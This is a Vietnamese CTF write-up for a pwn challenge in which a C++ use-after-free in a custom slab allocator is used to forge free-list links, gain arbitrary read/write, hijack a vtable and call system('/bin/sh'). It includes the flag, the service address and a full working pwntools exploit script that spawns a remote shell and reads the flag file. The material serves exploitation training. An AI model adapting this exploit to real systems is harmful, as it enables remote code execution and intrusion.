# PWN#004 — C++ vtable UAF trong custom slab allocator

**Flag:** CTF{cd8831a9ea1fa9b3ab39da0ad921964aABIVaaaaaaaaa}  
**Service:** nc 169.58.126.107 5007  
**Định dạng flag:** CTF{}

| Artifact | Bytes | SHA-256 |
|---|---:|---|

## Đề bài

> PWN#004 — 100 điểm. Lấy shell trên host từ xa và đọc flag.

Handout là binary C++ đã strip, triển khai menu “Pet Shelter”: thêm/xóa pet (cat hoặc dog), poke pet tối đa 32 byte, cho pet nói, và thêm/xóa/peek note tối đa 0x500 byte. Có thể xem remote wrapper từ bên trong container:

```text
socat TCP-LISTEN:5000,reuseaddr,fork EXEC:/challenge/pets,su=nobody
```

Process chạy dưới quyền nobody với cwd /challenge; flag nằm tại /flag/flag.txt và cũng có trong environment FLAG.

## Phân tích

### Binary và protections

file xác định đây là ELF 64-bit LSB PIE, dynamically linked và stripped, build bằng GCC Debian 14.2.0-19, BuildID bd715ba486e3daf1a2fe10356c4aad9ffafcbbba.

* PIE — mọi code/data address trong bài tính theo pie + offset.
* Full RELRO — .dynamic có BIND_NOW và GNU_RELRO bao phủ .got.
* NX — GNU_STACK là RW, không có cờ E.
* Stack canary — có __stack_chk_fail và kiểm tra %fs:0x28 trong mọi function.

Binary import libstdc++.so.6 và libc.so.6; không có import system/execve nên cần libc base. Trong binary không có pop rdi; ret và cũng không có syscall instruction.

### Menu và object layout

Có tám lựa chọn nhìn thấy được cùng một lựa chọn thứ chín ẩn mà menu không in:

```text
1) Add pet  2) Remove pet  3) Poke pet  4) Speak pet
5) Add note 6) Remove note 7) Peek note 8) Exit
```

Pet là heap object 0x20 byte: con trỏ vtable ở +0x00 và tên ở +0x08. Các bảng global là array thường gồm 16 entry:

| Symbol | Offset | Ghi chú |
|---|---:|---|
| pets[16] | 0x50a0 | con trỏ object, không được xóa khi remove |
| notes[16] | 0x5120 | con trỏ dữ liệu, không được xóa khi remove |
| note_sizes[16] | 0x51a0 | size được yêu cầu, giữ lại sau free |
| .got.plt | 0x4f60 | setvbuf, printf, write, strchr, ... |
| Cat vtable | 0x4cb0 | slot 0 = hàm in "%s says meow" |
| Dog vtable | 0x4c88 | slot 0 = hàm in "%s says woof" |
| Command vtable | 0x4c60 | slot 0 = Command::execute |

### Custom slab allocator

Yêu cầu tối đa 0x80 byte được cấp từ một slab new(0x4000) với ba size class — bảng rodata tại 0x3010 lưu {0x20, 0x40, 0x80}. Hàm tìm class duyệt tuần tự bảng này (0x1219): size không khớp class nào sẽ dùng operator new; nếu khớp class nhưng free list rỗng thì lấy chunk từ bump pointer của slab.

Free list theo class được lưu ngay trong chunk đã free, XOR-obfuscate bằng phép xoay địa chỉ chunk:

```c
free(o):  o[0] = head ^ rol(o, 7);  head = o;
alloc():  o = head;  head = o[0] ^ rol(o, 7);  return o;
```

Key không phải bí mật: chỉ cần địa chỉ chunk đang free, mà challenge cho leak địa chỉ này miễn phí (xem dưới). Kiểm soát o[0] của head hiện tại đồng nghĩa quyết định allocation kế tiếp trả về đâu.

### Use-after-free và Poke

Handler remove không đặt pets[] hay notes[] về 0, nên pet đã remove vẫn truy cập được qua menu 3. Poke là memcpy(pets[i], buf, n) thuần với n <= 32, ghi từ đầu object — kể cả khi chunk đã nằm trong free list. Đây vừa là vtable overwrite vừa là giả mạo free-list link.

Lưu ý: Remove gọi `vtable[1](obj)` mà không kiểm tra gì; Speak là thao tác duy nhất kiểm tra vtable pointer có nằm trong ba bảng được cho phép không, nếu không sẽ in [protection] rejected: vtable pointer not in whitelist.

### Lựa chọn 9 ẩn

Menu dispatch table tại 0x31a8 có 10 entry. Lựa chọn 9 vào handler in qword đầu tiên của pets[i]:

```c
printf("%p\n", *(void **)pets[idx]);
```

Không kiểm tra slot còn sống hay không, nên lựa chọn này tạo hai leak:

* Với cat còn sống, nó in pie + 0x4cb0.
* Với pet đã free, nó in free-list link bị obfuscate head ^ rol(obj, 7). Vì chunk đã free là head nên head = 0 và giá trị thực tế là rol(obj, 7).

### Command::execute

Command vtable được whitelist tại 0x4c60; slot 0 ở 0x243a giải mã rồi gọi function pointer được giữ trong object:

```asm
2455:  lea    0x8(%rax),%rax        ; rax = obj + 8
2465:  mov    (%rax),%rax
2468:  movabs $0x5f3759df2f2f2f2f,%rdx
2472:  xor    %rdx,%rax             ; fn = *(obj+8) ^ 0x5f3759df2f2f2f2f
2490:  add    $0x8,%rdx             ; rdx = obj + 16
2494:  mov    %rdx,%rdi             ; rdi = obj + 16
2497:  call   *%rax
```

Vì vậy Speak trên Command giả sẽ gọi fn(obj + 16), với rdi trỏ vào byte do ta kiểm soát hoàn toàn. Đặt fn = system thì command string nằm ở obj + 16; không cần stack pivot.

### libc trên remote

Đọc .got.plt qua arbitrary read sẽ lấy được các libc pointer đã resolve. Một lần chạy mẫu:

```text
setvbuf  0x7f7e9eebd470
printf   0x7f7e9ee95dc0
write    0x7f7e9ef41ee0
strchr   0x7f7e9efa4880
```

Hiệu setvbuf - printf = 0x276b0 cùng low page offset printf = 0xdc0, setvbuf = 0x470 khớp đúng ba build trong libc.rip: libc6_2.43-5_amd64, libc6_2.43-6_amd64 và libc6_2.43-7_amd64 — tức Debian glibc 2.43. Cả ba đều có printf = 0x5adc0, system = 0x541b0, environ = 0x1eede8, setcontext = 0x45e80.

Sau đó xác nhận base ngay trên target: 32 byte tại base là ELF header (7f454c4602010103...), còn 32 byte tại base + 0x541b0 là prologue của system (4885ff740be946fbffff...), khớp từng byte với libc6_2.43-5 và -6.

## Lời giải

### 1. Leak PIE và slab

```python
s.add_pet(0, 0, b"NAME0")
pie = s.vptr(0) - CAT_VT      # option 9 on a live Cat  -> pie + 0x4cb0
s.remove_pet(0)               # chunk 0 goes to the class-0 free list
obj = ror(s.vptr(0))          # option 9 on the freed chunk -> rol(obj, 7)
```

obj là địa chỉ chunk 0x20 đã free; pets[0] vẫn trỏ vào đó. Từ đây, dangling slot này được dùng để sửa free-list head.

### 2. Forged allocation: ghi tùy ý 32 byte

cycle(T, payload) thực hiện một vòng đầy đủ của allocator (phần thân Exploit.cycle):

```python
s.poke(0, p64(T ^ rol(self.obj)) + b"F" * 24)   # obj[0] = T ^ key  -> next = T
s.add_note(a, 32, b"Y" * 32)                    # pop obj, head := T
s.add_note(b, 32, payload.ljust(32, ZERO))      # pop T, write at T
s.remove_note(a)                                # push obj back as head
```

Hai note kích thước 32 dùng class 0x20, nên cả hai allocation lấy từ list đã giả mạo. Allocation thứ hai trả T và ghi 32 byte do attacker chọn. a và b là note slot nằm ngoài vùng 32 byte đang ghi (slot 1 được dành làm read window), nên thao tác không phá bookkeeping của chính nó.

### 3. Arbitrary read và libc base

Cùng cycle được dùng lại để dựng read window tồn tại lâu hơn. notes[1] bị ghi đè bằng địa chỉ cần đọc; Peek note ghi tối đa min(size, 0x20) byte từ notes[1] ra stdout:

```python
T = self.pie + NOTES + 8 * self.W
self.cycle(T, p64(addr), a, b)        # notes[1] = addr
return self.s.peek_note(self.W)[:32]
```

Lần arm đầu tự tham chiếu: forged chunk chính là địa chỉ notes[1], nên payload ghi vào slot sắp được dereference. Những lần sau chỉ cập nhật cùng slot. Một lần đọc tại pie + 0x4f60 lấy bốn GOT entry nêu trên, từ đó libc = printf - 0x5adc0.

### 4. Nhận diện libc remote

Các GOT value ban đầu được so với bản local (glibc 2.35/2.39/2.41) nhưng không khớp. Sau đó gửi delta setvbuf - printf và hai low page offset tới libc.rip /api/find; kết quả chỉ có glibc 2.43. Base được xác minh bằng cách đọc ELF header và prologue của system từ target. Challenge không kèm file libc, nhưng thư mục /challenge trên remote có libc.so.6 (2,014,248 byte) cùng loader và binary.

### 5. Một lần Poke để lấy shell

Khi đã biết pie, obj và libc, làm rỗng free list rồi cấp phát pet mới:

```python
s.poke(0, p64(rol(obj)) + b"F" * 24)   # link decrypts to 0 -> next alloc from the bump pointer
s.add_pet(1, 0, b"x\n")
payload = p64(pie + CMD_VT) + p64((libc + LIBC_SYSTEM) ^ CMD_XOR) + b"/bin/sh" + ZERO
s.poke(1, payload)
```

Speak trên pet 1 vượt whitelist (pie + 0x4c60); Command::execute giải mã obj + 8 thành system và gọi với rdi = obj + 16 = "/bin/sh". Shell kế thừa socket nên dòng tiếp theo gửi trên connection được xử lý như shell command.

## Mã khai thác

```python
#!/usr/bin/env python3
"""PWN#004 (pets): vtable UAF -> arbitrary R/W -> system("/bin/sh")."""
import struct
import time

from pwn import remote, log

HOST, PORT = "169.58.126.107", 5007

MASK = (1 << 64) - 1
ZERO = bytes([0])

CAT_VT = 0x4CB0            # Cat vtable
DOG_VT = 0x4C88            # Dog vtable
CMD_VT = 0x4C60            # Command vtable (slot 0 = execute)
CMD_XOR = 0x5F3759DF2F2F2F2F

NOTES = 0x5120             # notes[16]
GOT = 0x4F60               # .got.plt, setvbuf first

LIBC_PRINTF = 0x5ADC0      # glibc 2.43 (Debian libc6 2.43-5/6)
LIBC_SYSTEM = 0x541B0


def rol(v, n=7):
    v &= MASK
    return ((v << n) | (v >> (64 - n))) & MASK


def ror(v, n=7):
    v &= MASK
    return ((v >> n) | (v << (64 - n))) & MASK


def p64(x):
    return struct.pack("<Q", x & MASK)


def x64(b):
    b = bytes(b)
    return struct.unpack("<Q", b[:8])[0] if len(b) >= 8 else 0


class Shelter:
    def __init__(self, host=HOST, port=PORT, timeout=25):
        self.r = remote(host, port, timeout=timeout)
        self.r.recvuntil(b"> ", timeout=10)

    def _c(self, n):
        self.r.send(b"%d\n" % n)

    def add_pet(self, idx, kind=0, name=b"AAAA"):
        self._c(1)
        self.r.recvuntil(b"Index (0-15): ")
        self._c(idx)
        self.r.recvuntil(b"Kind (0=cat, 1=dog): ")
        self._c(kind)
        self.r.recvuntil(b"Name: ")
        self.r.send(name)
        self.r.recvuntil(b"> ", timeout=5)

    def remove_pet(self, idx):
        self._c(2)
        self.r.recvuntil(b"Index: ")
        self._c(idx)
        self.r.recvuntil(b"> ", timeout=5)

    def poke(self, idx, data):
        assert len(data) <= 32
        self._c(3)
        self.r.recvuntil(b"Index: ")
        self._c(idx)
        self.r.recvuntil(b"Bytes (up to 32): ")
        self.r.send(data)
        self.r.recvuntil(b"> ", timeout=5)

    def add_note(self, idx, size, content=b""):
        self._c(5)
        self.r.recvuntil(b"Index (0-15): ")
        self._c(idx)
        self.r.recvuntil(b"Size: ")
        self._c(size)
        self.r.recvuntil(b"Content: ")
        self.r.send(content)
        self.r.recvuntil(b"> ", timeout=5)

    def remove_note(self, idx):
        self._c(6)
        self.r.recvuntil(b"Index: ")
        self._c(idx)
        self.r.recvuntil(b"> ", timeout=5)

    def peek_note(self, idx):
        self._c(7)
        self.r.recvuntil(b"Index: ")
        self._c(idx)
        data = self.r.recvuntil(b"> ", timeout=5)
        assert data.startswith(b"Note: "), data[:24]
        data = data[len(b"Note: "):]
        cut = data.find(b"\n1) Add pet")
        if cut >= 0:
            data = data[:cut]
        return data

    def vptr(self, idx):
        """Hidden option 9: printf("%p\n", pets[idx]->vptr)."""
        self._c(9)
        self.r.recvuntil(b"Index: ")
        self._c(idx)
        out = self.r.recvuntil(b"\n", timeout=5)[:-1]
        return 0 if out == b"(nil)" else int(out, 16)

    def close(self):
        try:
            self.r.close()
        except Exception:
            pass


class Exploit:
    W = 1                  # notes[1] stays armed with the current read target

    def __init__(self, s):
        self.s = s
        self.work = list(range(16))
        self.pie = 0
        self.obj = 0
        self.armed = False

    def leak(self):
        s = self.s
        s.add_pet(0, 0, b"NAME0")
        self.pie = s.vptr(0) - CAT_VT          # live Cat -> pie + 0x4cb0
        s.remove_pet(0)                        # chunk 0 -> class-0 free list
        self.obj = ror(s.vptr(0))              # link is rol(obj, 7)
        log.success("pie=%#x slab/heap obj=%#x", self.pie, self.obj)

    def cycle(self, T, payload, a, b):
        """Forge the head link so that the second alloc returns T and writes there."""
        s = self.s
        s.poke(0, p64(T ^ rol(self.obj)) + b"F" * 24)
        s.add_note(a, 32, b"Y" * 32)                    # pop obj, head := T
        s.add_note(b, 32, payload.ljust(32, ZERO))      # pop T, write at T
        s.remove_note(a)                                # push obj back

    def _consume(self, *slots):
        for x in slots:
            if x in self.work:
                self.work.remove(x)

    def _covered(self, T):
        """Note slots whose own address lies inside [T, T+32)."""
        out = set()
        for k in range(16):
            if T <= self.pie + NOTES + 8 * k < T + 32:
                out.add(k)
        return out

    def _wk(self, avoid):
        cand = [x for x in self.work if x not in avoid]
        assert len(cand) >= 2, (self.work, avoid)
        return cand[0], cand[1]

    def read(self, addr, n=32):
        T = self.pie + NOTES + 8 * self.W
        cov = self._covered(T)
        if not self.armed:
            cand = [x for x in self.work if x not in cov or x == self.W]
            a = cand[0] if cand[0] != self.W else cand[1]
            b = self.W                              # write into notes[1] itself
            self.armed = True
        else:
            cand = [x for x in self.work if x not in cov]
            a, b = cand[0], cand[1]
        self.cycle(T, p64(addr), a, b)
        self._consume(a, b)
        return self.s.peek_note(self.W)[:n]


def exploit(cmd=b"/bin/sh"):
    s = Shelter()
    e = Exploit(s)
    e.leak()
    got = e.read(e.pie + GOT)                       # forged alloc -> arbitrary read
    libc = x64(got[8:16]) - LIBC_PRINTF             # GOT[1] = printf
    log.success("pie=%#x slab=%#x libc=%#x", e.pie, e.obj, libc)

    # empty the class-0 free list: the link decrypts to 0, so the next pet
    # is handed out by the bump pointer
    s.poke(0, p64(rol(e.obj)) + b"F" * 24)

    # obj[0]   = whitelisted Command vtable
    # obj[8]   = system ^ 0x5f3759df2f2f2f2f  (Command::execute decrypts it)
    # obj[16:] = command string, because execute() calls fn(obj + 16)
    s.add_pet(1, 0, b"x\n")
    payload = p64(e.pie + CMD_VT) + p64((libc + LIBC_SYSTEM) ^ CMD_XOR) + cmd + ZERO
    assert len(payload) <= 32, len(payload)
    s.poke(1, payload)
    return s


def readall(s, timeout=1.5):
    out = b""
    while True:
        try:
            d = s.r.recv(timeout=timeout)
        except Exception:
            break
        if not d:
            break
        out += d
    return out


def main():
    s = exploit()
    s.r.send(b"4\n")
    s.r.recvuntil(b"Index: ", timeout=5)
    s.r.send(b"1\n")                                # Speak -> execute -> system
    time.sleep(0.6)
    readall(s, 0.5)

    s.r.send(b"cat /flag/flag.txt; echo RC=$?\n")
    time.sleep(0.3)
    out = readall(s, 2.5)
    print(out.decode("utf-8", "replace"))
    s.close()


if __name__ == "__main__":
    main()
```

## Ghi chú

* Phần đuôi lạ trong ngoặc nhọn (ABIVaaaaaaaaa) đúng nguyên văn giá trị trong biến FLAG trên remote và file /flag/flag.txt, không phải lỗi chép lại.
* Chỉ Speak có kiểm tra. Remove gọi vtable[1] mà không whitelist, đây là một đường thứ hai không dùng tới để tạo cùng tác động.
* Lần thử cuối đầu tiên dựng setcontext pivot qua 15 pet liên tiếp nhưng bị crash, không có output. Pivot sai vì Command::execute gọi fn(obj + 16), không phải fn(obj + 8); fake ucontext bị đọc từ sai base. Khi hiểu đúng calling convention, chỉ cần một Poke nên bỏ toàn bộ pivot.
* Phải rút cạn free list (link giải mã thành 0) trước khi cấp phát pet sẽ bị poke; nếu không allocator có thể trả chunk tái sử dụng còn stale link.
* Lần gọi read() đầu tiên tự thiết lập notes[1]. Ghi 32 byte tại địa chỉ đó cũng xóa notes[2..4], vì vậy không được dùng lại các slot ấy cho forging cycle.
* ASLR đổi mỗi kết nối: cần leak lại pie, slab và libc mỗi lần. Offset printf/system hardcode chỉ đúng với glibc 2.43 trên target.
